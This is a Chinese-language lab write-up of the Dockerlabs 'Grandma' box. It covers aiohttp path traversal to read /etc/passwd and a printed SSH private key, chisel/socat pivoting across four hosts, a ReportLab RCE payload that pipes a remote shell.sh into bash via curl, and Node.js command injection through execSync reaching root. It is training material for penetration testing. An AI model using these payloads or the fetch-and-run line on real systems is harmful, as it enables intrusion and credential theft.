---
title: "Dockerlabs-Grandma"
date: 2025-02-24
categories: 
  - "dockerlabs"
tags: 
  - "dockerlabs"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Hard |

## Nmap 10.10.10.2

```
[root@kali] /home/kali/grandma  
❯ nmap 10.10.10.2 -sV  -A                                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 14:29 CST
Nmap scan report for 10.10.10.2
Host is up (0.000093s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:d4:14:46:ad:c7:15:dd:09:8d:5a:c9:4c:a0:41:86 (ECDSA)
|_  256 88:8f:11:21:2a:29:72:fb:60:cb:39:c7:97:05:aa:9d (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://grandma.dl/
5000/tcp open  http    aiohttp 3.9.1 (Python 3.12)
| http-title: Hospital - Calendar
|_Requested resource was /static/index.html
|_http-server-header: Python/3.12 aiohttp/3.9.1
MAC Address: 02:42:0A:0A:0A:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.09 ms 10.10.10.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
```

将**grandma.dl**添加到**/etc/hosts**

注意到在**5000**端口上有一个**aiohttp/3.9.1**的服务，可以进行目录穿越读取任意文件，在之前的文章中也涉及到过：[HTB-Chemistry - HYH](https://www.hyhforever.top/htb-chemistry/)

## CVE-2024-23334

扫描目录可以看到存在一个**static**目录

```
[root@kali] /home/kali/grandma  
❯ gobuster dir -u "http://10.10.10.2:5000/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2:5000/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/static               (Status: 403) [Size: 14]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
==============================================================
```

尝试读取**/etc/passwd**成功

```
[root@kali] /home/kali/grandma  
❯ curl -s --path-as-is "http://10.10.10.2:5000/static/../../../../../etc/passwd" 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
drzunder:x:1001:1001:,,,:/home/drzunder:/bin/bash
```

看到**/home**下存在**ubuntu**和**drzunder**两个用户

并且可以读取到**drzunder**的**ssh**密钥

```
[root@kali] /home/kali/grandma  
❯ curl -s --path-as-is "http://10.10.10.2:5000/static/../../../../../home/drzunder/.ssh/id_rsa"         
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![](./images/image-118.png)

拿下第一台主机权限

## Chisel Proxy

- [jpillora/chisel: A fast TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)

这里使用**chisel**来搭建代理，更方便一些

![](./images/image-121.png)

![](./images/image-122.png)

启动代理成功如图

## Nmap 20.20.20.3

```
[root@kali] /home/kali/grandma  
❯ proxychains nmap 20.20.20.3 -Pn -sT -p- 
```

可以看到开放了**2222**和**9000**端口

![](./images/image-120.png)

进入**9000**端口，可以看到是一个文件上传的页面

![](./images/image-123.png)

## Burp Settings

这里需要使用到一个插件：`FoxyProxy`，具体设置如下

![](./images/image-124.png)

访问**http://20.20.20.3:9000/**需要调到**grandma2**，抓包需要调到**burpsuite**

在**burpsuite**里需要设置一下网络连接

![](./images/image-125.png)

发包后可以看到一个网站：**http://www.reportlab.com**

![](./images/image-126.png)

## CVE-2023-33733

搜索查找到一个**CVE**漏洞

- [c53elyas/CVE-2023-33733: CVE-2023-33733 reportlab RCE](https://github.com/c53elyas/CVE-2023-33733)

得到攻击载荷

```
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

需要使用**socat**进行流量转发一下，我是直接把**kali**里面的**socat**传上去的

```
drzunder@e825ec493085:/tmp$ ./socat tcp-l:4444,fork,reuseaddr tcp:10.10.10.1:4444
```

攻击载荷应该修改为这样

```
<para>
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('curl http://20.20.20.2:8000/shell.sh | bash') for Attacker in [orgTypeFun('
Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self:
{setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
    exploit
    </font>
</para>
```

在**drzunder**上面准备一个反弹**shell**的脚本，并且开启**httpserver**服务

![](./images/image-127.png)

得到了**app**用户的**ssh**密钥

![](./images/image-128.png)

该机器上并没有开启**22**端口，需要手动指定为**2222**

![](./images/image-129.png)

## Proxy Bridge

如图搭建代理

![](./images/image-130.png)

![](./images/image-131.png)

![](./images/image-132.png)

中间需要**drzunder**作为流量转发点

## Nmap 30.30.30.3

```
Nmap scan report for 30.30.30.3
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
3000/tcp open  ppp
```

访问**3000**端口返回空白

抓包发现存在一个特殊字段

![](./images/image-133.png)

将其解码一下

```
YzMxZWNiMjItOTZiNS00MDNjLTkzMDMtMDU1ZTlmYTlhZGRi

c31ecb22-96b5-403c-9303-055e9fa9addb
```

将**/etc/passwd**进行**BASE64**加密后替换，成功读取到文件，并且存在**node**用户

![](./images/image-134.png)

成功读取到**node**的密钥

![](./images/image-135.png)

同样的方式搭建代理桥，让**app**也作为节点，这里不再重复。

## Nmap 40.40.40.3

```
[root@kali] /home/kali/grandma  
❯ proxychains nmap 40.40.40.3 -Pn -sT  2>/dev/null                                                                        ⏎

Nmap scan report for 40.40.40.3
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
9999/tcp open  abyss
```

可以看到只让**POST**

![](./images/image-136.png)

```
[root@kali] /home/kali  
❯ proxychains curl -X POST "http://40.40.40.3:9999/" 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  40.40.40.3:9999  ...  OK
{"message":"POST request received","users":[{"id":1,"name":"DrZunder"},{"id":2,"name":"DrMario"},{"id":3,"name":"App"},{"id":4,"name":"Node"},{"id":"Error","name":"Command error"}]}#     
```

这个错误消息似乎说明了，该网站对**Json**内容的解析有问题

尝试发送修改后的**id**字段，看到命令执行的结果

```
[root@kali] /home/kali  
❯ proxychains curl -s -X POST "http://40.40.40.3:9999" -H 'Content-Type: application/json' -d '{"id": "require(\"child_process\").execSync(\"id\").toString()"}'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  40.40.40.3:9999  ...  OK
{"message":"POST request received","users":[{"id":1,"name":"DrZunder"},{"id":2,"name":"DrMario"},{"id":3,"name":"App"},{"id":4,"name":"Node"},{"id":"Error","name":"Command error"}],"result":"uid=0(root) gid=0(root) groups=0(root)\n"}#      
```

并且当前用户的**root**权限

![](./images/image-138.png)

直接反弹**shell**就行了

## ReverseShellBridges

反弹**Shell**的全部代理

![](./images/image-139.png)

![](./images/image-140.png)

![](./images/image-141.png)

![](./images/image-142.png)

![](./images/image-143.png)

可以看到**socat**进行流量转发，最后把**40.40.40.3**的流量带到了**10.10.10.1**

## HttpBridges

下面是端口转发的全部代理，也就是访问**http**页面的代理

![](./images/image-144.png)

![](./images/image-145.png)

![](./images/image-146.png)

![](./images/image-147.png)

## Summary

终于到了**Summary**阶段，头都要炸了，由于不是单独的**UserRoot**，这里就随便说一点。

这个靶机中有四个主机，需要逐个搭建代理。

在本文中使用到了**chisel**作为代理工具，主要是因为不需要太多配置，**frp**的配置文件就比较繁琐。

**socat**这个工具也是第一次在多层转发的场景下使用，感觉又学到了新东西。

对内网渗透有了更加深刻的理解！
